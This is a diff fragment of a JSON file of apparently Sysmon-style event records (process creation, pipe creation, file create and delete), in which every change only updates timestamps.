     {
@@ -559,7 +559,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.237656+00:00"
+        "timestamp": "2026-05-06T16:38:10.824302+00:00"
       }
     },
     {
@@ -573,7 +573,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.237656+00:00"
+        "timestamp": "2026-05-06T16:38:10.824302+00:00"
       }
     },
     {
@@ -587,7 +587,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.237656+00:00"
+        "timestamp": "2026-05-06T16:38:10.824302+00:00"
       }
     },
     {
@@ -601,7 +601,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.237656+00:00"
+        "timestamp": "2026-05-06T16:38:10.826306+00:00"
       }
     },
     {
@@ -615,7 +615,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.238654+00:00"
+        "timestamp": "2026-05-06T16:38:10.826306+00:00"
       }
     },
     {
@@ -629,7 +629,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.310117+00:00"
+        "timestamp": "2026-05-06T16:38:10.880721+00:00"
       }
     },
     {
@@ -643,7 +643,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.317137+00:00"
+        "timestamp": "2026-05-06T16:38:10.886738+00:00"
       }
     },
     {
@@ -657,7 +657,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.323137+00:00"
+        "timestamp": "2026-05-06T16:38:10.891343+00:00"
       }
     },
     {
@@ -671,7 +671,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.324137+00:00"
+        "timestamp": "2026-05-06T16:38:10.891343+00:00"
       }
     },
     {
@@ -685,7 +685,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-06T14:37:06.324137+00:00"
+        "timestamp": "2026-05-06T16:38:10.891343+00:00"
       }
     },
     {
@@ -699,7 +699,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-06T14:37:06.324137+00:00"
+        "timestamp": "2026-05-06T16:38:10.891343+00:00"
       }
     },
     {
@@ -713,7 +713,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-06T14:37:06.325137+00:00"
+        "timestamp": "2026-05-06T16:38:10.891343+00:00"
       }
     },
     {
@@ -727,7 +727,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-06T14:37:06.325137+00:00"
+        "timestamp": "2026-05-06T16:38:10.891343+00:00"
       }
     },
     {
@@ -741,7 +741,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-06T14:37:06.326137+00:00"
+        "timestamp": "2026-05-06T16:38:10.893346+00:00"
       }
     },
     {
@@ -755,7 +755,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-06T14:37:06.333137+00:00"
+        "timestamp": "2026-05-06T16:38:10.899366+00:00"
       }
     },
     {
@@ -769,7 +769,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-06T14:37:06.334137+00:00"
+        "timestamp": "2026-05-06T16:38:10.899366+00:00"
       }
     },
     {
@@ -783,7 +783,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-06T14:37:06.334137+00:00"
+        "timestamp": "2026-05-06T16:38:10.899366+00:00"
       }
     },
     {
@@ -797,7 +797,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.334137+00:00"
+        "timestamp": "2026-05-06T16:38:10.900573+00:00"
       }
     },
     {
@@ -811,7 +811,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.335137+00:00"
+        "timestamp": "2026-05-06T16:38:10.900573+00:00"
       }
     },
     {
@@ -825,7 +825,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-06T14:37:06.339113+00:00"
+        "timestamp": "2026-05-06T16:38:10.902582+00:00"
       }
     },
     {
